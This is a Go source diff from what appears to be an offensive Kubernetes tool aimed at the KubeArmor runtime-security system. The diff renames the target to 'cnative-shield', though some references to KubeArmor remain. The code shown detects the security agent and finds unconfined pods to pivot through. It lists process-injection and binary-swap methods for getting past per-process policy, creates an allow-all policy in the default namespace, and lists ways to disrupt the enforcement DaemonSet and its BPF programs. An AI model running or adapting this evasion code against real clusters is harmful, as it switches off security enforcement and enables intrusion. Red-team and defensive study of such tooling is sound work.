@@ -12,11 +12,11 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-var kubeArmorPolicyGVR = schema.GroupVersionResource{
+var cnativeShieldPolicyGVR = schema.GroupVersionResource{
 	Group: "security.kubearmor.com", Version: "v1", Resource: "kubearmorpolicies",
 }
 
-func detectKubeArmor(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeShield(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"kubearmor", "kube-system", "accuknox-agents"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -24,10 +24,10 @@ func detectKubeArmor(ctx context.Context, client kubernetes.Interface) []Detecti
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "kubearmor",
+				Name:      "cnative-shield",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d kubearmor daemon pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-shield daemon pods", len(pods.Items)),
 			}}
 		}
 	}
@@ -37,7 +37,7 @@ func detectKubeArmor(ctx context.Context, client kubernetes.Interface) []Detecti
 	})
 	if err == nil && len(pods.Items) > 0 {
 		return []DetectionSystem{{
-			Name:      "kubearmor",
+			Name:      "cnative-shield",
 			Detected:  true,
 			Namespace: pods.Items[0].Namespace,
 			Details:   fmt.Sprintf("kubearmor-relay found in %s", pods.Items[0].Namespace),
@@ -47,27 +47,27 @@ func detectKubeArmor(ctx context.Context, client kubernetes.Interface) []Detecti
 	return nil
 }
 
-// EvadeKubeArmor executes the specified KubeArmor evasion technique.
-func EvadeKubeArmor(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// EvadeCnativeShield executes the specified cnative-shield evasion technique.
+func EvadeCnativeShield(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "policy_audit":
-		return kubeArmorPolicyAudit(ctx, dynClient)
+		return cnativeShieldPolicyAudit(ctx, dynClient)
 	case "unconfined":
-		return kubeArmorUnconfined(ctx, client, dynClient)
+		return cnativeShieldUnconfined(ctx, client, dynClient)
 	case "process_inject":
-		return kubeArmorProcessInject(ctx, dynClient)
+		return cnativeShieldProcessInject(ctx, dynClient)
 	case "allow_all":
-		return kubeArmorAllowAll(ctx, dynClient)
+		return cnativeShieldAllowAll(ctx, dynClient)
 	default:
-		return kubeArmorPolicyAudit(ctx, dynClient)
+		return cnativeShieldPolicyAudit(ctx, dynClient)
 	}
 }
 
-func kubeArmorPolicyAudit(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeShieldPolicyAudit(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("KubeArmor Policy Audit:\n\n")
+	sb.WriteString("cnative-shield Policy Audit:\n\n")
 
-	policies, err := dynClient.Resource(kubeArmorPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	policies, err := dynClient.Resource(cnativeShieldPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list KubeArmorPolicies: %v\n", err)
 		sb.WriteString("  KubeArmor CRDs may not be installed\n")
@@ -138,11 +138,11 @@ func kubeArmorPolicyAudit(ctx context.Context, dynClient dynamic.Interface) (*Ev
 	}, nil
 }
 
-func kubeArmorUnconfined(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeShieldUnconfined(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("KubeArmor Unconfined Pod Discovery:\n\n")
+	sb.WriteString("cnative-shield Unconfined Pod Discovery:\n\n")
 
-	policies, err := dynClient.Resource(kubeArmorPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	policies, err := dynClient.Resource(cnativeShieldPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		return &EvasionResult{Technique: "unconfined", Success: false, Output: fmt.Sprintf("cannot list policies: %v", err)}, nil
 	}
@@ -210,7 +210,7 @@ func kubeArmorUnconfined(ctx context.Context, client kubernetes.Interface, dynCl
 	}
 
 	fmt.Fprintf(&sb, "\n  Total unconfined pods: %d\n", unconfined)
-	sb.WriteString("  These pods have NO KubeArmor enforcement — full access\n")
+	sb.WriteString("  These pods have NO cnative-shield enforcement — full access\n")
 	sb.WriteString("  Strategy: inject into or pivot through unconfined workloads\n")
 
 	return &EvasionResult{
@@ -220,16 +220,16 @@ func kubeArmorUnconfined(ctx context.Context, client kubernetes.Interface, dynCl
 	}, nil
 }
 
-func kubeArmorProcessInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeShieldProcessInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("KubeArmor Process Injection Evasion:\n\n")
+	sb.WriteString("cnative-shield Process Injection Evasion:\n\n")
 
-	policies, err := dynClient.Resource(kubeArmorPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	policies, err := dynClient.Resource(cnativeShieldPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		return &EvasionResult{Technique: "process_inject", Success: false, Output: fmt.Sprintf("cannot list policies: %v", err)}, nil
 	}
 
-	sb.WriteString("  KubeArmor enforces per-process. If we inject into an allowed process,\n")
+	sb.WriteString("  cnative-shield enforces per-process. If we inject into an allowed process,\n")
 	sb.WriteString("  our code runs under that process's allowed policy.\n\n")
 
 	allowedProcesses := make(map[string][]string)
@@ -270,7 +270,7 @@ func kubeArmorProcessInject(ctx context.Context, dynClient dynamic.Interface) (*
 	sb.WriteString("    3. LD_PRELOAD via /proc/<pid>/environ manipulation\n")
 	sb.WriteString("    4. Symlink binary name to match an allowed path\n")
 	sb.WriteString("    5. Copy payload to allowed path, execute, then restore original\n\n")
-	sb.WriteString("  KubeArmor checks the binary path at exec time, not content.\n")
+	sb.WriteString("  cnative-shield checks the binary path at exec time, not content.\n")
 	sb.WriteString("  Replacing an allowed binary's content is invisible to policy.\n")
 
 	return &EvasionResult{
@@ -280,9 +280,9 @@ func kubeArmorProcessInject(ctx context.Context, dynClient dynamic.Interface) (*
 	}, nil
 }
 
-func kubeArmorAllowAll(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeShieldAllowAll(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("KubeArmor Allow-All Policy Injection:\n\n")
+	sb.WriteString("cnative-shield Allow-All Policy Injection:\n\n")
 
 	allowAllPolicy := &unstructured.Unstructured{
 		Object: map[string]any{
@@ -325,7 +325,7 @@ func kubeArmorAllowAll(ctx context.Context, dynClient dynamic.Interface) (*Evasi
 		},
 	}
 
-	_, err := dynClient.Resource(kubeArmorPolicyGVR).Namespace("default").Create(ctx, allowAllPolicy, metav1.CreateOptions{})
+	_, err := dynClient.Resource(cnativeShieldPolicyGVR).Namespace("default").Create(ctx, allowAllPolicy, metav1.CreateOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Allow-all policy creation failed: %v\n", err)
 		sb.WriteString("  Fallback: modify existing policies to add broad exceptions\n\n")
@@ -339,7 +339,7 @@ func kubeArmorAllowAll(ctx context.Context, dynClient dynamic.Interface) (*Evasi
 		sb.WriteString("  Empty selector matches ALL pods in the namespace\n")
 	}
 
-	sb.WriteString("\n  KubeArmor defaultPosture modes:\n")
+	sb.WriteString("\n  cnative-shield defaultPosture modes:\n")
 	sb.WriteString("    - 'audit'  → logs violations but doesn't block\n")
 	sb.WriteString("    - 'block'  → enforces policy (default)\n")
 	sb.WriteString("  Changing to 'audit' globally disables all enforcement\n")
@@ -351,10 +351,10 @@ func kubeArmorAllowAll(ctx context.Context, dynClient dynamic.Interface) (*Evasi
 	}, nil
 }
 
-// DisruptKubeArmor identifies disruption vectors for KubeArmor DaemonSets.
-func DisruptKubeArmor(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+// DisruptCnativeShield identifies disruption vectors for cnative-shield DaemonSets.
+func DisruptCnativeShield(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("KubeArmor Disruption:\n\n")
+	sb.WriteString("cnative-shield Disruption:\n\n")
 
 	namespaces := []string{"kubearmor", "kube-system", "accuknox-agents"}
 	found := false
@@ -373,7 +373,7 @@ func DisruptKubeArmor(ctx context.Context, client kubernetes.Interface) (*Evasio
 	}
 
 	if !found {
-		sb.WriteString("  No KubeArmor DaemonSet found\n")
+		sb.WriteString("  No cnative-shield DaemonSet found\n")
 	}
 
 	sb.WriteString("\n  Disruption techniques:\n")
@@ -386,7 +386,7 @@ func DisruptKubeArmor(ctx context.Context, client kubernetes.Interface) (*Evasio
 	sb.WriteString("    - If BPF-LSM backend: unpin BPF programs from /sys/fs/bpf/\n")
 
 	return &EvasionResult{
-		Technique: "disrupt_kubearmor",
+		Technique: "disrupt_cnative_shield",
 		Success:   found,
 		Output:    sb.String(),
 	}, nil
